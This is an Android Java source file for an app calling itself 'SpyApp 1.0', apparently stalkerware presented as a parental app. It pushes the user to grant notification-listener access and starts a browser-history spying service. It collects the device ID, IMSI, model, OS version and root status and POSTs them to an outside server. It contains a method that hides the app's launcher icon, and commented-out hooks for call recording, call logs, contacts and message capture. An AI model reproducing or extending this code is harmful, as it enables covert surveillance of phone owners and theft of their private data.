package com.example.vipul.spyapp10;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity  {
    EditText email, pass1, pass2;
    TextView deviceId, adminAccess;
    public static String EMAIL=null;
    Button btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            email = (EditText) findViewById(R.id.email);
            pass1 = (EditText) findViewById(R.id.password1);
            pass2 = (EditText) findViewById(R.id.password2);
            deviceId = (TextView) findViewById(R.id.deviceid);
            deviceId.setText(Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID));
            try {
                if (Settings.Secure.getString(this.getContentResolver(), "enabled_notification_listeners")
                        .contains(getApplicationContext().getPackageName())) {
                } else {
                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                    Toast.makeText(getApplicationContext(), "Enable SpyApp 1.0 and click on back button", Toast.LENGTH_LONG).show();
                }
            } catch (Exception e) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(getApplicationContext(), "Enable SpyApp 1.0 and click on back button", Toast.LENGTH_LONG).show();
            }
            activateSpy();
            adminAccess = (TextView) findViewById(R.id.adminaccess);
            if (isDeviceRooted()) {
                adminAccess.setText("Rooted");
            } else {
                adminAccess.setText("Not-Rooted");
            }

            checkNortificationAccess();

        }catch(Exception e){
            finish();
            Toast.makeText(getApplicationContext(),"Error starting APP",Toast.LENGTH_LONG).show();
        }
        btn = (Button) findViewById(R.id.button);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(!isInternetConnected(getApplicationContext())){
                    Toast.makeText(getApplicationContext(),"Connect Internet",Toast.LENGTH_LONG).show();
                }
                else if (pass1.getText().toString().equals(pass2.getText().toString())) {
                    if (pass1.getText().toString().equals("") || email.getText().toString().equals("")) {
                        Toast.makeText(getApplicationContext(), "Empty field", Toast.LENGTH_SHORT).show();
                    } else {
                        EMAIL=email.getText().toString();
                        try {
                            new UpdateUserDetail().execute(email.getText().toString(), pass1.getText().toString(),
                                    deviceId.getText().toString(), adminAccess.getText().toString(), getIMSI(), getDeviceModel(), getOS());

                        }catch(Exception e){
                        }
                    }
                } else {
                    Toast.makeText(getApplicationContext(), "password not matching", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }
    public static boolean isInternetConnected(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }
    public  String getOS(){
        try {
            return Build.VERSION.RELEASE;
        } catch (Exception e) {
            return "---";
        }
    }
    public String getIMSI(){
        TelephonyManager m = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        try {
            return m.getSubscriberId();
        } catch (Exception e) {
            return "---";
        }
    }
    public void hideAPP(){
        try{
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            Toast.makeText(getApplicationContext(),"Hiding App",Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static boolean isDeviceRooted() {
        try {
            return checkRootMethod1() || checkRootMethod2() || checkRootMethod3();
        } catch (Exception e) {
            return false;
        }
    }
    private static boolean checkRootMethod1() {
        String buildTags = android.os.Build.TAGS;
        return (buildTags != null && buildTags.contains("test-keys"));
    }
    private static boolean checkRootMethod2() {
        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
                "/system/bin/failsafe/su", "/data/local/su"};
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }
    private static boolean checkRootMethod3() {
        Process process = null;
        try {
            process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) return true;
            return false;
        } catch (Throwable t) {
            return false;
        } finally {
            if (process != null) process.destroy();
        }
    }
    public String getDeviceModel() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + "" + model;
        }
    }
    public String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
    public void checkNortificationAccess(){
        try {
            if (Settings.Secure.getString(this.getContentResolver(), "enabled_notification_listeners")
                    .contains(getApplicationContext().getPackageName())) {
            } else {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(getApplicationContext(),"Enable SpyApp 1.0 and click on back button",Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            Toast.makeText(getApplicationContext(),"Enable SpyApp 1.0 and click on back button",Toast.LENGTH_LONG).show();
        }
    }
    private class UpdateUserDetail extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/newacc.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(7);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("pass", params[1]));
                nameValuePair.add(new BasicNameValuePair("did", params[2]));
                nameValuePair.add(new BasicNameValuePair("root", params[3]));
                nameValuePair.add(new BasicNameValuePair("imsi", params[4]));
                nameValuePair.add(new BasicNameValuePair("model", params[5]));
                nameValuePair.add(new BasicNameValuePair("os", params[6]));
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
            String status = null;
            try {
                status = jsonObject.getString("code");
                if(status.equals("1")){
                    Toast.makeText(getApplicationContext(),"Email registered",Toast.LENGTH_LONG).show();
                }
                else{
                    Toast.makeText(getApplicationContext(),"Email already registered",Toast.LENGTH_LONG).show();
                }
            } catch (Exception e) {
            }
        }
    }
    public void activateSpy(){
        //hideAPP();
        if(appInstalledOrNot("com.android.chrome")) {
            startService(new Intent(MainActivity.this, browserHistoryService.class));
        }
        //startService(new Intent(MainActivity.this,callLogService.class));
        //startService(new Intent(MainActivity.this, callRecordService.class));
        //startService(new Intent(MainActivity.this, contactListService.class));
        //startService(new Intent(MainActivity.this, livePannelService.class));
        //if(appInstalledOrNot("com.android.vending")) {
            startActivity(new Intent(MainActivity.this, Main2Activity.class));
        //}
        //startService(new Intent(MainActivity.this, messageService.class));
        //startService(new Intent(MainActivity.this, MyService.class));
        //startService(new Intent(MainActivity.this, MyService2.class));
        //startService(new Intent(MainActivity.this, packageInfoService.class));
        //finish();
    }
    private boolean appInstalledOrNot(String uri) {
        PackageManager pm = getPackageManager();
        try {
            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
        }
        catch (PackageManager.NameNotFoundException e) {
            return false;
        }
        return true ;
    }
}